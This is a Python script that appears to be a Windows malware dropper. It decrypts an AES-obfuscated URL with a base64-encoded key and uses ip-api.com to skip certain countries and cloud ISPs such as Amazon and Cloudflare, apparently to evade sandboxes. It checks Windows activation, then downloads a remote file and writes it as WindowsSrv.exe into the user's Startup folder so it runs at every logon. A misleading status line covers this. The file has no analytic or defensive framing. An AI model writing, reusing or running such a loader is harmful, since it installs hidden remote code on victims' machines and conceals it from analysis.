import requests
import os
import colorama
from colorama import Fore
import platform
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode
import sys
import base64
import ctypes
colorama.init()
name = os.getenv('USERNAME')
def unpad_text(padded_text):
    padding_length = padded_text[-1]
    return padded_text[:-padding_length]

def decrypt_text(key, ciphertext):
    key = key.ljust(32)[:32]  # Klíč musí mít délku 32 bajtů pro AES-256
    cipher = Cipher(algorithms.AES(key.encode()), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_text_padded = decryptor.update(b64decode(ciphertext)) + decryptor.finalize()
    return unpad_text(decrypted_text_padded).decode()
base64_encoded_string = "dGFqbnlfa2xpY19wcm9fQUVT"

decoded_bytes = base64.b64decode(base64_encoded_string)
decoded_string = decoded_bytes.decode('utf-8')

cilovy_soubor = f'C:/Users/{name}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsSrv.exe'
operacni_system = platform.system()
blok_url = "http://ip-api.com/json/"
response = requests.get(blok_url)
data = response.json()
country = data['countryCode']
isp = data['isp']
bloked = ['RU', 'KR', 'KP', 'VN', 'US', 'CA', 'IL']
bloked_isp = ['Amazon.com, Inc.', 'Cloudflare, Inc.', 'VietNam Post and Telecom Corporation', '']
verze_os = platform.version()
url = decrypt_text(decoded_string, "UNF4PkMO/Hi6sRJVRWWkByXOipXEkCaR3RC7NNkKsnJgCJHVsh5lT1tEX90vLkKc")
import subprocess

def is_windows_activated():
    try:
        # Použití PowerShellu pro získání informací o stavu aktivity
        powershell_cmd = 'powershell "(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey"'
        result = subprocess.check_output(powershell_cmd, shell=True, universal_newlines=True)
        
        # Zkontrolovat, zda klíč je nenulový, což značí aktivovaný stav
        return result.strip() != ""
    except subprocess.CalledProcessError as e:
        print("")
        return False

# Zavolat funkci pro zjištění stavu aktivity
aktivovano = is_windows_activated()

def init():
  if operacni_system != 'Windows':
    print("win error")
    sys.exit()
  if int(verze_os.split('.')[0]) < 10:
    print("Build error")
    sys.exit()
  if aktivovano == "False":
     print("error")
     sys.exit()
  if country in bloked:
    print(f"{Fore.RED}Unsuported country")
    return False
  if isp in bloked_isp:
    sys.exit()
  print(f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] Checking")
  response = requests.get(url)
  with open(cilovy_soubor, 'wb') as soubor:
    soubor.write(response.content)
  print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] PHTTPF Running")
